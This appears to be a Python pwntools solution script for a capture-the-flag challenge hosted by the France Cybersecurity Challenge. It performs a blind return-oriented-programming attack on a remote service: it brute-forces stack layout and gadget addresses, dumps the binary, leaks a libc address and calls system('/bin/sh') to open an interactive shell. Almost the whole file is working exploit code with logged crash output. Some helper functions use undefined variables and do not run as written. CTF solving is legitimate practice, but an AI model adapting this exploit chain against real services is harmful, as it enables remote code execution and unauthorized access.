#!/usr/bin/python3
from pwn import *
import sys 
import time

STOP_GADGETS = [0x400668]

CSU_POP = 0x40073a
POP_RDI = CSU_POP+0x9
POP_RSI_R15 = CSU_POP+0x7

GADGET_LEAK = 0x400510
FFLUSH_GOT = 0x400000 + 0x200FF0
FFLUSH_OFFSET = 0x069ab0
OFFT_BINSH = 0x1633e8

SYSTEM = 0x041490 

"""
__libc_start_main 	0x021a50 	0x0
system 	0x041490 	0x1fa40
fflush 	0x069ab0 	0x48060
open 	0x0db950 	0xb9f00
read 	0x0dbb90 	0xba140
write 	0x0dbbf0 	0xba1a0
str_bin_sh 	0x1633e8 	0x141998
"""

# POP_RAX = 0x4005ef 
# SYSCALL = 0x4003f5 

# BASE_PLT = 0x400520

context.log_level = 'error'

def start():
    return remote("challenges2.france-cybersecurity-challenge.fr", 4008)

def padd(s):
    return s + b"\x00"*(8-(len(s) % 8))

def unpadd(s):
    return s.split(b"\x00")[0]

def is_crash(s):
    return not (len(s) == 0)

def is_stop(s, ip, padding):
    return (ip not in STOP_GADGETS) and (s == b"Thanks " + padding + unpadd(p64(ip)) + b">>> ") 

def is_syscall(recv_time):
    return recv_time > 30

def leak_u64(padding, ptr, to=0, r=b""):
    pattern = b"Thanks " + padding + unpadd(p64(POP_RDI))
    resp_tmp = try_jmp(padding + p64(POP_RDI) + p64(ptr+to) + p64(POP_RSI_R15) + p64(0x0)*2 + p64(GADGET_LEAK) + p64(STOP_GADGETS[0]) + p64(0xdeadbeef))
    
    if not len(resp_tmp):
        to += 1
        r += b"\x00"
        return leak_u64(padding, ptr, to, r)

    r += resp_tmp[len(pattern):resp_tmp.index(b'>>> ')]

    if len(r) + to >= 0x8:
        return int.from_bytes(r, 'little')

    to += len(r)

    return leak_u64(padding, ptr, to, r)

def leak(padding: str):
    leak1 = b""
    while len(leak1) < 8:
        for i in range(256):
            p = start()
            hex_byte = p8(i)
            buf = padding + leak1 + hex_byte
            p.write(buf)
            resp=p.recv(1000)
            print(f"Trying on {hex(ord(hex_byte))}")
            if b'Bye!' in resp:
                leak1 += hex_byte
                print("[*] byte : %r" % hex_byte)
                break
            if(i==255):
                print(resp)
                print(f"leak: {hex(int.from_bytes(padd(leakn), 'little'))}")
                print(av+leak1)
                raise ValueError('Hum :(')

    return leak1

def jmp(av):
    io = start()
    io.write(av)
    return io.recvall(timeout=5.0)

def find_padding(p=b""):
    padding = p + b"\x90"
    print(f"[*] sending: {padding}")
    resp = jmp(padding)
    print(f"[*] recv: {resp}")
    while b"Hello you.\nWhat is your name ?\n>>> Thanks " + padding in resp:
        return find_padding(p=padding)
    return padding[:len(padding)-1] # minus one char because we do not want that padding overwrite the return address

av = b"A"*40
i = 0
__set_ = False

def leak2(padding: str, leak1=b""):
    for i in range(256):
        buf = padding + leak1 + p8(i)
        resp = try_jmp(buf)
        # print(f"Trying on {hex(int.from_bytes(leak1+p8(i), 'little') << (64 - counter*8))}")
        if len(resp):
            print(f"[{hex(int.from_bytes(padd(leak1+p8(i)), 'little'))}] Output: {resp}")
            if len(leak1) < 8:
                leak2(padding, leak1=leak1+p8(i))
            else:
                return leak1

    return leak1

def leak2_opti(padding: str):
    base = 0x400000

    for i in range(0x2000):
        buf = padding + p64(base+i)
        resp = try_jmp(buf)
        # print(f"Trying on {hex(int.from_bytes(leak1+p8(i), 'little') << (64 - counter*8))}")
        if len(resp):
            print(f"[{hex(base+i)}] Output: {resp}")
            continue

    return leak1

def find_brop(padding):
    base = 0x400000

    for i in range(0, 0x2000):
        buf = padding + p64(base + i) + p64(0xdeadbeef) * 6 + p64(STOP_GADGETS[0])
        resp = try_jmp(buf)
        if is_stop(resp, base+i, padding):
            print(f"Output: {resp}, leak: {hex(int.from_bytes(p64(base + i), 'little'))}")
            break

        if not i % 35:
            print(f"_ - {hex(i)}")

    return base + i

def dump_binary(padding, base):
    gadget_leak = 0x400510
    i = 0 
    buf = b""

    pattern = b"Thanks " + padding + unpadd(p64(POP_RDI))

    f = open("leet_dump.bin", "ab")

    while base+i < 0x400fff:
        resp1 = try_jmp(padding + p64(POP_RDI) + p64(base+i) + p64(POP_RSI_R15) + p64(0x0)*2 + p64(gadget_leak) + p64(STOP_GADGETS[0]) + p64(0xdeadbeef))

        if not len(resp1):
            continue

        leak = resp1[len(pattern):resp1.index(b'>>> ')]
        
        if not len(leak):
            buf += b"\x00"
            print(f"[*] recv @ {hex(base+i)}: 0x00")
            i += 1
        else:
            buf += leak
            print(f"[*] recv @ {hex(base+i)}: {leak.hex()}")

            i = i + len(leak)
        
        if len(buf) >= 0x100:
            f.write(buf)
            buf = b""
            print("Buffering ..")

def find_plt(padding):
    base = 0x400000 
    s = 0 

    for i in range(0x0, 0x3000, 0x10):
        resp1 = try_jmp(padding + p64(POP_RDI) + p64(0x400000) + p64(POP_RSI_R15) + p64(0x400000)*2 + p64(base+i) + p64(STOP_GADGETS[0]) + p64(0xdeadbeef)) 

        if is_stop(resp1, base+i, padding):
            print(f"Output: {resp1.hex()}, leak: {hex(int.from_bytes(p64(base + i), 'little'))}")

        elif len(resp1):
            print(f"[{hex(base+i)}] Out: {resp1.hex()}")

def try_jmp(s):
    while True:
        try:
            io = start()
            io.write(s)
            resp = io.recv(500, timeout=30.0)[35:]
            break
        except:
            print(f"STOP: {sys.exc_info()[0]}")
            resp = -1 
            break

    return resp

def try_jmp_flow(s):
    while True:
        try:
            io = start()
            io.write(s)
            resp = io.recv(500, timeout=30.0)[35:]
            break
        except:
            print(f"STOP: {sys.exc_info()[0]}")
            resp = -1 
            break

    return resp, io

""" 
while True:
    leakn = leak2(av)
    print(f"[{i}] Leak: {hex(int.from_bytes(leakn, 'little'))}")
    av += leakn
    i += 1
"""

#[0x4004cd] CRASH: b'Thanks AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xcd\x04@>>> '
#[0x4004dd] CRASH: b'Thanks AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xdd\x04@>>> '
#[0x400597] CRASH: b'Thanks AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x97\x05@>>> '
#[0x40059c] CRASH: b'Thanks AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x9c\x05@>>> '
#[0x4005a0] CRASH: b'Thanks AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xa0\x05@>>> '
#[0x4005a1] CRASH: b'Thanks AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xa1\x05@>>> '
#[0x4005a3] CRASH: b'Thanks AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xa3\x05@>>> '
#[0x4005a5] CRASH: b'Thanks AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xa5\x05@>>> '
#[0x4005b4] CRASH: b'Thanks AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xb4\x05@>>> '
#[0x4005b7] CRASH: b'Thanks AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xb7\x05@>>> '
#[0x4005b8] CRASH: b'Thanks AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xb8\x05@>>> '
#[0x4005d6] CRASH: b'Thanks AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xd6\x05@>>> '
#[0x4005dd] CRASH: b'Thanks AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xdd\x05@>>> '
#[0x4005de] CRASH: b'Thanks AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xde\x05@>>> '
#[0x4005e1] CRASH: b'Thanks AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xe1\x05@>>> '
#[0x4005e2] CRASH: b'Thanks AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xe2\x05@>>> '
#[0x4005e4] CRASH: b'Thanks AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xe4\x05@>>> '
#[0x4005e5] CRASH: b'Thanks AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xe5\x05@>>> '
#[0x4005e7] CRASH: b'Thanks AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xe7\x05@>>> '
#[0x4005e8] CRASH: b'Thanks AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xe8\x05@>>> '
#[0x4005eb] CRASH: b'Thanks AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xeb\x05@>>> '
#[0x4005ec] CRASH: b'Thanks AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xec\x05@>>> '
#[0x4005ee] CRASH: b'Thanks AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xee\x05@>>> '
#[0x4005ef] CRASH: b'Thanks AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xef\x05@>>> '
#[0x4005f1] CRASH: b'Thanks AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xf1\x05@>>> '
#[0x4005f3] CRASH: b'Thanks AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xf3\x05@>>> '
#[0x400605] CRASH: b'Thanks AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x05\x06@>>> '
#[0x400608] CRASH: b'Thanks AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x08\x06@>>> '
#[0x40061d] CRASH: b'Thanks AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x1d\x06@>>> '
#[0x400622] CRASH: b'Thanks AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"\x06@>>> '
#[0x400650] CRASH: b'Thanks AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP\x06@>>> '
#[0x4006d6] CRASH: b'Thanks AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xd6\x06@>>> '
#[0x4006db] CRASH: b'Thanks AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xdb\x06@>>> '
#[0x4006e2] CRASH: b'Thanks AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xe2\x06@>>> '
#[0x4006e3] CRASH: b'Thanks AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xe3\x06@>>> '
#[0x400742] CRASH: b'Thanks AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAB\x07@>>> '
#[0x400743] CRASH: b'Thanks AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAC\x07@>>> '
#[0x400758] CRASH: b'Thanks AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAX\x07@>>> '

candidate = [0x400758]

def find_gadgets(padding):
    base = 0x400000 
    global candidate

    for i in range(0, 0xffff):
        curr = base + i

        resp = try_jmp(padding + p64(curr) +  p64(0xdeadbeef) + p64(STOP_GADGETS[0]) + p64(0xdeadbeef)*10)

        if is_stop(resp, curr, padding):
            print(f"[{hex(curr)}] CRASH: {resp}")
            candidate.append(curr)

            continue

        print(f"[{hex(curr)}] _")

def find_syscall(padding, base, candid):
    pop_rax = candid
    i = 0
    curr = base

    while True:
        curr = base + i
        if curr in candidate:
            i += 1
            continue
        elif curr >= 0x401100 and candidate.index(pop_rax) < len(candidate):
            pop_rax = candidate[candidate.index(pop_rax)+1]
            i = 0
            base = 0x400000
            continue

        start_time = time.time()
        resp = try_jmp(padding + p64(pop_rax) +  p64(34) + p64(curr) + p64(STOP_GADGETS[0]) + p64(0xdeadbeef)*20)
        recv_time = time.time() - start_time

        if resp == -1:
            dump(curr, pop_rax)
            return

        if is_syscall(recv_time):
            start_time = time.time()
            resp = try_jmp(padding + p64(pop_rax) +  p64(34) + p64(curr) + p64(STOP_GADGETS[0]) + p64(0xdeadbeef)*20)
            recv_time = time.time() - start_time

            if resp == -1:
                dump(curr, pop_rax)
                return

            if is_syscall(recv_time):
                print(f"[{hex(curr)}] SYSCALL, pop_rax={hex(pop_rax)}, time={recv_time}")
                f = open("found", 'w+')
                f.write(hex(curr) + " " + hex(pop_rax))
                f.close()
                i += 1
                continue
            i += 1 
            continue

        i += 1
        print(f"[{hex(curr)}] _ => {hex(pop_rax)}, time={recv_time}")

def test(padding, base):
    while True:
        start_time = time.time()
        resp = try_jmp(padding + p64(POP_RAX) + p64(34) + p64(SYSCALL) + p64(STOP_GADGETS[0]) + p64(0xdeadbeef))
        recv_time = time.time() - start_time

        if resp == -1:
            dump(curr, pop_rax)
            return

        if is_syscall(recv_time):
            print(f"[{hex(curr)}] SYSCALL")
            i += 1
            break

        print(f"[{1337}] _ => time={recv_time}")
        break

def leak_rdx(padding, base, apop_rdx):
    i = 0
    curr = base

    pop_rdx = apoprdx

    while True:
        curr = base + i
        
        if curr >= 0x401100:
            pop_rdx = candidate[candidate.index(pop_rax)+1]
            i = 0
            base = 0x400000
            continue

        start_time = time.time()
        resp = try_jmp(padding + p64(pop_rax) +  p64(34) + p64(curr) + p64(STOP_GADGETS[0]) + p64(0xdeadbeef)*20)
        recv_time = time.time() - start_time

        if resp == -1:
            dump(curr, pop_rax)
            return

        if is_syscall(recv_time):
            print(f"[{hex(curr)}] SYSCALL, pop_rax={hex(pop_rax)}")
            f = open("found", 'w+')
            f.write(hex(curr) + " " + hex(pop_rax))
            f.close()
            i += 1
            continue

        i += 1
        print(f"[{hex(curr)}] _ => {hex(pop_rax)}, time={recv_time}")

#def ret2csu(s):
#    s += p64(CSU_POP)
    

def flow(padding):
    payload = av
    payload += p64(POP_RDI)
    payload += p64(FFLUSH_GOT)
    payload += p64(POP_RSI_R15) + p64(0xffffffffffffffff)*2
    payload += p64(GADGET_LEAK)
    payload += p64(0x400000 + 0x656) # ret2main

    pattern = b"Thanks " + padding + unpadd(p64(POP_RDI))
    resp_tmp, io = try_jmp_flow(payload)
    print(resp_tmp)
    leak_fflush = int.from_bytes(resp_tmp[len(pattern):resp_tmp.index(b'What is')], 'little')

    libc = leak_fflush - FFLUSH_OFFSET 
    print(f"libc @ {hex(libc)}")

    payload = av
    payload += p64(POP_RDI)
    payload += p64(libc + OFFT_BINSH)
    payload += p64(libc + SYSTEM)

    io.send(payload)
    io.interactive()
# dump_binary(av, int(sys.argv[1]))

# find_syscall(av, 0x4006e4, candidate[0])
#print(candidate)
#find_plt(av)
# find_ret(av)
"""
for i in range(0, 0xffff, 0x10):
    print(f"[{hex(0x400000+i)}]")
    r = try_jmp(av + p64(0x400000+i) + p64(STOP_GADGETS[0]) + p64(0xdeadbeef)*20)
    resp2 = try_jmp(av + p64(0x400000+i) + p64(0x400000+i+6) + p64(STOP_GADGETS[0]) + p64(0xdeadbeef)*20)

    if is_stop(r, 0x400000+i, av) and is_stop(resp2, 0x400000+i+6, av):
        print(f"PLT found: {hex(0x400000+i)}, resp1={r}, resp2={resp2}")
"""
# test(av, 0x400000)
# print(try_jmp(av + p64(POP_RDI) + p64(0x4000000) + p64(POP_RSI_R15) + p64(0xffffffffffffffff)*2 + p64(0x400510) + p64(STOP_GADGETS[0]) + p64(0xdeadbeef)))
flow(av)
#print(hex(leak_u64(av, 0x400000 + 0x200FE0)))

# print(find_plt(av))
# dump_binary(av, 0x400000)